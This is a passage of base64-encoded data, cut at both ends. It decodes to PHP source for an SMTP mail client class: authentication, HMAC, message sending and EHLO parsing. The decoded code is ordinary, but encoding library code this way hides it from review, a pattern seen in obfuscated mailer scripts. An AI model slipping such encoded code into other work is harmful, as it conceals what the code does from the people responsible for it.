gICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgc2VsZjo6ZWRlYnVnKCdBdXRoIG1ldGhvZCByZXF1ZXN0ZWQ6ICcgLiAoJGF1dGh0eXBlID8gJGF1dGh0eXBlIDogJ1VOS05PV04nKSwgc2VsZjo6REVCVUdfTE9XTEVWRUwpOw0KICAgICAgICAgICAgc2VsZjo6ZWRlYnVnKCdBdXRoIG1ldGhvZHMgYXZhaWxhYmxlIG9uIHRoZSBzZXJ2ZXI6ICcgLiBpbXBsb2RlKCcsJywgJHRoaXMtPnNlcnZlcl9jYXBzWydBVVRIJ10pLCBzZWxmOjpERUJVR19MT1dMRVZFTCk7DQogICAgICAgICAgICBpZiAoZW1wdHkoJGF1dGh0eXBlKSkgew0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKGFycmF5KA0KICAgICAgICAgICAgICAgICAgICAnQ1JBTS1NRDUnLA0KICAgICAgICAgICAgICAgICAgICAnTE9HSU4nLA0KICAgICAgICAgICAgICAgICAgICAnUExBSU4nLA0KICAgICAgICAgICAgICAgICAgICAnTlRMTScsDQogICAgICAgICAgICAgICAgICAgICdYT0FVVEgyJw0KICAgICAgICAgICAgICAgICkgYXMgJG1ldGhvZCkgew0KICAgICAgICAgICAgICAgICAgICBpZiAoaW5fYXJyYXkoJG1ldGhvZCwgJHRoaXMtPnNlcnZlcl9jYXBzWydBVVRIJ10pKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkYXV0aHR5cGUgPSAkbWV0aG9kOw0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgaWYgKGVtcHR5KCRhdXRodHlwZSkpIHsNCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCdObyBzdXBwb3J0ZWQgYXV0aGVudGljYXRpb24gbWV0aG9kcyBmb3VuZCcpOw0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHNlbGY6OmVkZWJ1ZygnQXV0aCBtZXRob2Qgc2VsZWN0ZWQ6ICcgLiAkYXV0aHR5cGUsIHNlbGY6OkRFQlVHX0xPV0xFVkVMKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmICghaW5fYXJyYXkoJGF1dGh0eXBlLCAkdGhpcy0+c2VydmVyX2NhcHNbJ0FVVEgnXSkpIHsNCiAgICAgICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoIlRoZSByZXF1ZXN0ZWQgYXV0aGVudGljYXRpb24gbWV0aG9kIFwiJGF1dGh0eXBlXCIgaXMgbm90IHN1cHBvcnRlZCBieSB0aGUgc2VydmVyIik7DQogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGVsc2VpZiAoZW1wdHkoJGF1dGh0eXBlKSkgew0KICAgICAgICAgICAgJGF1dGh0eXBlID0gJ0xPR0lOJzsNCiAgICAgICAgfQ0KICAgICAgICBzd2l0Y2ggKCRhdXRodHlwZSkgew0KICAgICAgICAgICAgY2FzZSAnUExBSU4nOg0KICAgICAgICAgICAgICAgIGlmICghJHRoaXMtPnNlbmRDb21tYW5kKCdBVVRIJywgJ0FVVEggUExBSU4nLCAzMzQpKSB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgaWYgKCEkdGhpcy0+c2VuZENvbW1hbmQoJ1VzZXIgJiBQYXNzd29yZCcsIGJhc2U2NF9lbmNvZGUoIlwwIiAuICR1c2VybmFtZSAuICJcMCIgLiAkcGFzc3dvcmQpLCAyMzUpKSB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBjYXNlICdMT0dJTic6DQogICAgICAgICAgICAgICAgaWYgKCEkdGhpcy0+c2VuZENvbW1hbmQoJ0FVVEgnLCAnQVVUSCBMT0dJTicsIDMzNCkpIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT5zZW5kQ29tbWFuZCgiVXNlcm5hbWUiLCBiYXNlNjRfZW5jb2RlKCR1c2VybmFtZSksIDMzNCkpIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT5zZW5kQ29tbWFuZCgiUGFzc3dvcmQiLCBiYXNlNjRfZW5jb2RlKCRwYXNzd29yZCksIDIzNSkpIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgJ1hPQVVUSDInOg0KICAgICAgICAgICAgICAgIGlmIChpc19udWxsKCRPQXV0aCkpIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAkb2F1dGggPSAkT0F1dGgtPmdldE9hdXRoNjQoKTsNCiAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT5zZW5kQ29tbWFuZCgnQVVUSCcsICdBVVRIIFhPQVVUSDIgJyAuICRvYXV0aCwgMjM1KSkgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgY2FzZSAnTlRMTSc6DQogICAgICAgICAgICAgICAgJHRlbXAgICAgICAgID0gbmV3IHN0ZENsYXNzOw0KICAgICAgICAgICAgICAgICRudGxtX2NsaWVudCA9IG5ldyBudGxtX3Nhc2xfY2xpZW50X2NsYXNzOw0KICAgICAgICAgICAgICAgIGlmICghJG50bG1fY2xpZW50LT5pbml0aWFsaXplKCR0ZW1wKSkgew0KICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJHRlbXAtPmVycm9yKTsNCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygnWW91IG5lZWQgdG8gZW5hYmxlIHNvbWUgbW9kdWxlcyBpbiB5b3VyIHBocC5pbmkgZmlsZTogJyAuICR0aGlzLT5lcnJvclsnZXJyb3InXSwgc2VsZjo6REVCVUdfQ0xJRU5UKTsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAkbXNnMSA9ICRudGxtX2NsaWVudC0+dHlwZU1zZzEoJHJlYWxtLCAkd29ya3N0YXRpb24pOw0KICAgICAgICAgICAgICAgIGlmICghJHRoaXMtPnNlbmRDb21tYW5kKCdBVVRIIE5UTE0nLCAnQVVUSCBOVExNICcgLiBiYXNlNjRfZW5jb2RlKCRtc2cxKSwgMzM0KSkgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICRjaGFsbGVuZ2UgPSBzdWJzdHIoJHRoaXMtPmxhc3RfcmVwbHksIDMpOw0KICAgICAgICAgICAgICAgICRjaGFsbGVuZ2UgPSBiYXNlNjRfZGVjb2RlKCRjaGFsbGVuZ2UpOw0KICAgICAgICAgICAgICAgICRudGxtX3JlcyAgPSAkbnRsbV9jbGllbnQtPk5UTE1SZXNwb25zZShzdWJzdHIoJGNoYWxsZW5nZSwgMjQsIDgpLCAkcGFzc3dvcmQpOw0KICAgICAgICAgICAgICAgICRtc2czICAgICAgPSAkbnRsbV9jbGllbnQtPnR5cGVNc2czKCRudGxtX3JlcywgJHVzZXJuYW1lLCAkcmVhbG0sICR3b3Jrc3RhdGlvbik7DQogICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5zZW5kQ29tbWFuZCgnVXNlcm5hbWUnLCBiYXNlNjRfZW5jb2RlKCRtc2czKSwgMjM1KTsNCiAgICAgICAgICAgIGNhc2UgJ0NSQU0tTUQ1JzoNCiAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT5zZW5kQ29tbWFuZCgnQVVUSCBDUkFNLU1ENScsICdBVVRIIENSQU0tTUQ1JywgMzM0KSkgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICRjaGFsbGVuZ2UgPSBiYXNlNjRfZGVjb2RlKHN1YnN0cigkdGhpcy0+bGFzdF9yZXBseSwgNCkpOw0KICAgICAgICAgICAgICAgICRyZXNwb25zZSAgPSAkdXNlcm5hbWUgLiAnICcgLiAkdGhpcy0+aG1hYygkY2hhbGxlbmdlLCAkcGFzc3dvcmQpOw0KICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+c2VuZENvbW1hbmQoJ1VzZXJuYW1lJywgYmFzZTY0X2VuY29kZSgkcmVzcG9uc2UpLCAyMzUpOw0KICAgICAgICAgICAgZGVmYXVsdDoNCiAgICAgICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoIkF1dGhlbnRpY2F0aW9uIG1ldGhvZCBcIiRhdXRodHlwZVwiIGlzIG5vdCBzdXBwb3J0ZWQiKTsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIHRydWU7DQogICAgfQ0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBobWFjKCRkYXRhLCAka2V5KSB7DQogICAgICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ2hhc2hfaG1hYycpKSB7DQogICAgICAgICAgICByZXR1cm4gaGFzaF9obWFjKCdtZDUnLCAkZGF0YSwgJGtleSk7DQogICAgICAgIH0NCiAgICAgICAgJGJ5dGVsZW4gPSA2NDsNCiAgICAgICAgaWYgKHN0cmxlbigka2V5KSA+ICRieXRlbGVuKSB7DQogICAgICAgICAgICAka2V5ID0gcGFjaygnSConLCBtZDUoJGtleSkpOw0KICAgICAgICB9DQogICAgICAgICRrZXkgICAgPSBzdHJfcGFkKCRrZXksICRieXRlbGVuLCBjaHIoMHgwMCkpOw0KICAgICAgICAkaXBhZCAgID0gc3RyX3BhZCgnJywgJGJ5dGVsZW4sIGNocigweDM2KSk7DQogICAgICAgICRvcGFkICAgPSBzdHJfcGFkKCcnLCAkYnl0ZWxlbiwgY2hyKDB4NWMpKTsNCiAgICAgICAgJGtfaXBhZCA9ICRrZXkgXiAkaXBhZDsNCiAgICAgICAgJGtfb3BhZCA9ICRrZXkgXiAkb3BhZDsNCiAgICAgICAgcmV0dXJuIG1kNSgka19vcGFkIC4gcGFjaygnSConLCBtZDUoJGtfaXBhZCAuICRkYXRhKSkpOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gY29ubmVjdGVkKCkgew0KICAgICAgICBpZiAoaXNfcmVzb3VyY2UoJHRoaXMtPnNtdHBfY29ubikpIHsNCiAgICAgICAgICAgICRzb2NrX3N0YXR1cyA9IHN0cmVhbV9nZXRfbWV0YV9kYXRhKCR0aGlzLT5zbXRwX2Nvbm4pOw0KICAgICAgICAgICAgaWYgKCRzb2NrX3N0YXR1c1snZW9mJ10pIHsNCiAgICAgICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCdTTVRQIE5PVElDRTogRU9GIGNhdWdodCB3aGlsZSBjaGVja2luZyBpZiBjb25uZWN0ZWQnLCBzZWxmOjpERUJVR19DTElFTlQpOw0KICAgICAgICAgICAgICAgICR0aGlzLT5jbG9zZSgpOw0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGNsb3NlKCkgew0KICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJycpOw0KICAgICAgICAkdGhpcy0+c2VydmVyX2NhcHMgPSBudWxsOw0KICAgICAgICAkdGhpcy0+aGVsb19ycGx5ICAgPSBudWxsOw0KICAgICAgICBpZiAoaXNfcmVzb3VyY2UoJHRoaXMtPnNtdHBfY29ubikpIHsNCiAgICAgICAgICAgIGZjbG9zZSgkdGhpcy0+c210cF9jb25uKTsNCiAgICAgICAgICAgICR0aGlzLT5zbXRwX2Nvbm4gPSBudWxsOw0KICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygnQ29ubmVjdGlvbjogY2xvc2VkJywgc2VsZjo6REVCVUdfQ09OTkVDVElPTik7DQogICAgICAgIH0NCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGRhdGEoJG1zZ19kYXRhKSB7DQogICAgICAgIGlmICghJHRoaXMtPnNlbmRDb21tYW5kKCdEQVRBJywgJ0RBVEEnLCAzNTQpKSB7DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgJGxpbmVzICAgICAgPSBleHBsb2RlKCJcbiIsIHN0cl9yZXBsYWNlKGFycmF5KA0KICAgICAgICAgICAgIlxyXG4iLA0KICAgICAgICAgICAgIlxyIg0KICAgICAgICApLCAiXG4iLCAkbXNnX2RhdGEpKTsNCiAgICAgICAgJGZpZWxkICAgICAgPSBzdWJzdHIoJGxpbmVzWzBdLCAwLCBzdHJwb3MoJGxpbmVzWzBdLCAnOicpKTsNCiAgICAgICAgJGluX2hlYWRlcnMgPSBmYWxzZTsNCiAgICAgICAgaWYgKCFlbXB0eSgkZmllbGQpICYmIHN0cnBvcygkZmllbGQsICcgJykgPT09IGZhbHNlKSB7DQogICAgICAgICAgICAkaW5faGVhZGVycyA9IHRydWU7DQogICAgICAgIH0NCiAgICAgICAgZm9yZWFjaCAoJGxpbmVzIGFzICRsaW5lKSB7DQogICAgICAgICAgICAkbGluZXNfb3V0ID0gYXJyYXkoKTsNCiAgICAgICAgICAgIGlmICgkaW5faGVhZGVycyBhbmQgJGxpbmUgPT0gJycpIHsNCiAgICAgICAgICAgICAgICAkaW5faGVhZGVycyA9IGZhbHNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgd2hpbGUgKGlzc2V0KCRsaW5lW3NlbGY6Ok1BWF9MSU5FX0xFTkdUSF0pKSB7DQogICAgICAgICAgICAgICAgJHBvcyA9IHN0cnJwb3Moc3Vic3RyKCRsaW5lLCAwLCBzZWxmOjpNQVhfTElORV9MRU5HVEgpLCAnICcpOw0KICAgICAgICAgICAgICAgIGlmICghJHBvcykgew0KICAgICAgICAgICAgICAgICAgICAkcG9zICAgICAgICAgPSBzZWxmOjpNQVhfTElORV9MRU5HVEggLSAxOw0KICAgICAgICAgICAgICAgICAgICAkbGluZXNfb3V0W10gPSBzdWJzdHIoJGxpbmUsIDAsICRwb3MpOw0KICAgICAgICAgICAgICAgICAgICAkbGluZSAgICAgICAgPSBzdWJzdHIoJGxpbmUsICRwb3MpOw0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICRsaW5lc19vdXRbXSA9IHN1YnN0cigkbGluZSwgMCwgJHBvcyk7DQogICAgICAgICAgICAgICAgICAgICRsaW5lICAgICAgICA9IHN1YnN0cigkbGluZSwgJHBvcyArIDEpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAoJGluX2hlYWRlcnMpIHsNCiAgICAgICAgICAgICAgICAgICAgJGxpbmUgPSAiXHQiIC4gJGxpbmU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJGxpbmVzX291dFtdID0gJGxpbmU7DQogICAgICAgICAgICBmb3JlYWNoICgkbGluZXNfb3V0IGFzICRsaW5lX291dCkgew0KICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJGxpbmVfb3V0KSBhbmQgJGxpbmVfb3V0WzBdID09ICcuJykgew0KICAgICAgICAgICAgICAgICAgICAkbGluZV9vdXQgPSAnLicgLiAkbGluZV9vdXQ7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICR0aGlzLT5jbGllbnRfc2VuZCgkbGluZV9vdXQgLiBzZWxmOjpDUkxGKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICAkc2F2ZXRpbWVsaW1pdCAgID0gJHRoaXMtPlRpbWVsaW1pdDsNCiAgICAgICAgJHRoaXMtPlRpbWVsaW1pdCA9ICR0aGlzLT5UaW1lbGltaXQgKiAyOw0KICAgICAgICAkcmVzdWx0ICAgICAgICAgID0gJHRoaXMtPnNlbmRDb21tYW5kKCdEQVRBIEVORCcsICcuJywgMjUwKTsNCiAgICAgICAgJHRoaXMtPlRpbWVsaW1pdCA9ICRzYXZldGltZWxpbWl0Ow0KICAgICAgICByZXR1cm4gJHJlc3VsdDsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGhlbGxvKCRob3N0ID0gJycpIHsNCiAgICAgICAgcmV0dXJuIChib29sZWFuKSAoJHRoaXMtPnNlbmRIZWxsbygnRUhMTycsICRob3N0KSBvciAkdGhpcy0+c2VuZEhlbGxvKCdIRUxPJywgJGhvc3QpKTsNCiAgICB9DQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIHNlbmRIZWxsbygkaGVsbG8sICRob3N0KSB7DQogICAgICAgICRub2Vycm9yICAgICAgICAgPSAkdGhpcy0+c2VuZENvbW1hbmQoJGhlbGxvLCAkaGVsbG8gLiAnICcgLiAkaG9zdCwgMjUwKTsNCiAgICAgICAgJHRoaXMtPmhlbG9fcnBseSA9ICR0aGlzLT5sYXN0X3JlcGx5Ow0KICAgICAgICBpZiAoJG5vZXJyb3IpIHsNCiAgICAgICAgICAgICR0aGlzLT5wYXJzZUhlbGxvRmllbGRzKCRoZWxsbyk7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkdGhpcy0+c2VydmVyX2NhcHMgPSBudWxsOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkbm9lcnJvcjsNCiAgICB9DQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIHBhcnNlSGVsbG9GaWVsZHMoJHR5cGUpIHsNCiAgICAgICAgJHRoaXMtPnNlcnZlcl9jYXBzID0gYXJyYXkoKTsNCiAgICAgICAgJGxpbmVzICAgICAgICAgICAgID0gZXhwbG9kZSgiXG4iLCAkdGhpcy0+aGVsb19ycGx5KTsNCiAgICAgICAgZm9yZWFjaCAoJGxpbmVzIGFzICRuID0+ICRzKSB7DQogICAgICAgICAgICAkcyA9IHRyaW0oc3Vic3RyKCRzLCA0KSk7DQogICAgICAgICAgICBpZiAoZW1wdHkoJHMpKSB7DQogICAgICAgICAgICAgICAgY29udGludWU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkZmllbGRzID0gZXhwbG9kZSgnICcsICRzKTsNCiAgICAgICAgICAgIGlmICghZW1wdHkoJGZpZWxkcykpIHsNCiAgICAgICAgICAgICAgICBpZiAoISRuKSB7DQogICAgICAgICAgICAgICAgICAgICRuYW1lICAgPSAkdHlwZTsNCiAgICAgICAgICAgICAgICAgICAgJGZpZWxkcyA9ICRmaWVsZHNbMF07DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgJG5hbWUgPSBhcnJheV9zaGlmdCgkZmllbGRzKTsNCiAgICAgICAgICAgICAgICAgICAgc3dpdGNoICgkbmFtZSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAnU0laRSc6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGZpZWxkcyA9ICgkZmllbGRzID8gJGZpZWxkc1swXSA6IDApOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAnQVVUSCc6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFpc19hcnJheSgkZmllbGRzKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZmllbGRzID0gYXJyYXkoKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRmaWVsZHMgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICR0aGlzLT5zZXJ2ZXJfY2Fwc1skbmFtZV0gPSAkZmllbGRzOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBtYWlsKCRmcm9tKSB7DQogICAgICAgICR1c2VWZXJwID0gKCR0aGlzLT5kb192ZXJwID8gJyBYVkVSUCcgOiAnJyk7DQogICAgICAgIHJldHVybiAkdGhpcy0+c2VuZENvbW1hbmQoJ01BSUwgRlJPTScsICdNQUlMIEZST006PCcgLiAkZnJvbSAuICc+JyAuICR1c2VWZXJwLCAyNTApOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gcXVpdCgkY2xvc2Vfb25fZXJyb3IgPSB0cnVlKSB7DQogICAgICAgICRub2Vycm9yID0gJHRoaXMtPnNlbmRDb21tYW5kKCdRVUlUJywgJ1FVSVQnLCAyMjEpOw0KICAgICAgICAkZXJyICAgICA9ICR0aGlzLT5lcnJvcjsNCiAgICAgICAgaWYgKCRub2Vycm9yIG9yICRjbG9zZV9vbl9lcnJvcikgew0KICAgICAgICAgICAgJHRoaXMtPmNsb3NlKCk7DQogICAgICAgICAgICAkdGhpcy0+ZXJyb3IgPSAkZXJyOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkbm9lcnJvcjsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIHJlY2lwaWVudCgkYWRkcmVzcykgew0KICAgICAgICByZXR1cm4gJHRoaXMtPnNlbmRDb21tYW5kKCdSQ1BUIFRPJywgJ1JDUFQgVE86PCcgLiAkYWRkcmVzcyAuICc+JywgYXJyYXkoDQogICAgICAgICAgICAyNTAsDQogICAgICAgICAgICAyNTENCiAgICAgICAgKSk7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiByZXNldCgpIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5zZW5kQ29tbWFuZCgnUlNFVCcsICdSU0VUJywgMjUwKTsNCiAgICB9DQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIHNlbmRDb21tYW5kKCRjb21tYW5kLCAkY29tbWFuZHN0cmluZywgJGV4cGVjdCkgew0KICAgICAgICBpZiAoISR0aGlzLT5jb25uZWN0ZWQoKSkgew0KICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCJDYWxsZWQgJGNvbW1hbmQgd2l0aG91dCBiZWluZyBjb25uZWN0ZWQiKTsNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoc3RycG9zKCRjb21tYW5kc3RyaW5nLCAiXG4iKSAhPT0gZmFsc2Ugb3Igc3RycG9zKCRjb21tYW5kc3RyaW5nLCAiXHIiKSAhPT0gZmFsc2UpIHsNCiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigiQ29tbWFuZCAnJGNvbW1hbmQnIGNvbnRhaW5lZCBsaW5lIGJyZWFrcyIpOw0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgICR0aGlzLT5jbGllbnRfc2VuZCgkY29tbWFuZHN0cmluZyAuIHNlbGY6OkNSTEYpOw0KICAgICAgICAkdGhpcy0+bGFzdF9yZXBseSA9ICR0aGlzLT5nZXRfbGluZXMoKTsNCiAgICAgICAgJG1hdGNoZXMgICAgICAgICAgPSBhcnJheSgpOw0KICAgICAgICBpZiAocHJlZ19tYXRjaCgiL14oWzAtOV17M30pWyAtXSg/OihbMC05XVxcLlswLTldXFwuWzAtOV0pICk/LyIsICR0aGlzLT5sYXN0X3JlcGx5LCAkbWF0Y2hlcykpIHsNCiAgICAgICAgICAgICRjb2RlICAgID0gJG1hdGNoZXNbMV07DQogICAgICAgICAgICAkY29kZV9leCA9IChjb3VudCgkbWF0Y2hlcykgPiAyID8gJG1hdGNoZXNbMl0gOiBudWxsKTsNCiAgICAgICAgICAgICRkZXRhaWwgID0gcHJlZ19yZXBsYWNlKCIveyRjb2RlfVsgLV0iIC4gKCRjb2RlX2V4ID8gc3RyX3JlcGxhY2UoJy4nLCAnXFwuJywgJGNvZGVfZXgpIC4gJyAnIDogJycpIC4gIi9tIiwgJycsICR0aGlzLT5sYXN0X3JlcGx5KTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRjb2RlICAgID0gc3Vic3RyKCR0aGlzLT5sYXN0X3JlcGx5LCAwLCAzKTsNCiAgICAgICAgICAgICRjb2RlX2V4ID0gbnVsbDsNCiAgICAgICAgICAgICRkZXRhaWwgID0gc3Vic3RyKCR0aGlzLT5sYXN0X3JlcGx5LCA0KTsNCiAgICAgICAgfQ0KICAgICAgICAkdGhpcy0+ZWRlYnVnKCdTRVJWRVIgLT4gQ0xJRU5UOiAnIC4gJHRoaXMtPmxhc3RfcmVwbHksIHNlbGY6OkRFQlVHX1NFUlZFUik7DQogICAgICAgIGlmICghaW5fYXJyYXkoJGNvZGUsIChhcnJheSkgJGV4cGVjdCkpIHsNCiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigiJGNvbW1hbmQgY29tbWFuZCBmYWlsZWQiLCAkZGV0YWlsLCAkY29kZSwgJGNvZGVfZXgpOw0KICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygnU01UUCBFUlJPUjogJyAuICR0aGlzLT5lcnJvclsnZXJyb3InXSAuICc6ICcgLiAkdGhpcy0+bGFzdF9yZXBseSwgc2VsZjo6REVCVUdfQ0xJRU5UKTsNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJycpOw0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIHNlbmRBbmRNYWlsKCRmcm9tKSB7DQogICAgICAgIHJldHVybiAkdGhpcy0+c2VuZENvbW1hbmQoJ1NBTUwnLCAiU0FNTCBGUk9NOiRmcm9tIiwgMjUwKTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIHZlcmlmeSgkbmFtZSkgew0KICAgICAgICByZXR1cm4gJHRoaXMtPnNlbmRDb21tYW5kKCdWUkZZJywgIlZSRlkgJG5hbWUiLCBhcnJheSgNCiAgICAgICAgICAgIDI1MCwNCiAgICAgICAgICAgIDI1MQ0KICAgICAgICApKTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIG5vb3AoKSB7DQogICAgICAgIHJldHVybiAkdGhpcy0+c2VuZENvbW1hbmQoJ05PT1AnLCAnTk9PUCcsIDI1MCk7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiB0dXJuKCkgew0KICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJ1RoZSBTTVRQIFRVUk4gY29tbWFuZCBpcyBub3QgaW1wbGVtZW50ZWQnKTsNCiAgICAgICAgJHRoaXMtPmVkZWJ1ZygnU01UUCBOT1RJQ0U6ICcgLiAkdGhpcy0+ZXJyb3JbJ2Vycm9yJ10sIHNlbGY6OkRFQlVHX0NMSUVOVCk7DQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGNsaWVudF9zZW5kKCRkYXRhKSB7DQogICAgICAgICR0aGlzLT5lZGVidWcoIkNMSUVOVCAtPiBTRVJWRVI6ICRkYXRhIiwgc2VsZjo6REVCVUdfQ0xJRU5UKTsNCiAgICAgICAgcmV0dXJuIGZ3cml0ZSgkdGhpcy0+c210cF9jb25uLCAkZGF0YSk7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRFcnJvcigpIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5lcnJvcjsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGdldFNlcnZlckV4dExpc3QoKSB7DQogICAgICAgIHJldHVybiAkdGhpcy0+c2VydmVyX2NhcHM7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRTZXJ2ZXJFeHQoJG5hbWUpIHsNCiAgICAgICAgaWYgKCEkdGhpcy0+c2VydmVyX2NhcHMpIHsNCiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcignTm8gSEVMTy9FSExPIHdhcyBzZW50Jyk7DQogICAgICAgICAgICByZXR1cm4gbnVsbDsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoIWFycmF5X2tleV9leGlzdHMoJG5hbWUsICR0aGlzLT5zZXJ2ZXJfY2FwcykpIHsNCiAgICAgICAgICAgIGlmICgkbmFtZSA9PSAnSEVMTycpIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPnNlcnZlcl9jYXBzWydFSExPJ107DQogICAgICAg